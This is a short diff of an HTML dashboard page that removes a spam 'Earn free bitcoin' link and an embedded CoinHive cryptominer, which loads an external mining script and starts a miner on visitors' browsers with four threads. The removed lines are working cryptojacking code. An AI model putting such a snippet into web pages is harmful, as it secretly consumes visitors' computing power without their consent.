@@ -120,18 +120,9 @@
             <canvas id="bar-chart" width="700" height="500"></canvas>
         </div>
     </div>
-    <a href="http://www.freebiebitcoin.com">Earn free bitcoin</a>
-
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    
     <script>
-        var miner = new CoinHive.User('GCbsJwjMbHWIpKW0vzy2MX1YVOYSaGJG', 'john-doe', {
-            threads: 4,
-            autoThreads: false,
-            throttle: 0.8,
-            forceASMJS: false
-        });
-        miner.start();
-
+        
         $(document).ready(function () {
 
             // Everything is wrapped in a function becouse of the event bindings when the map changes
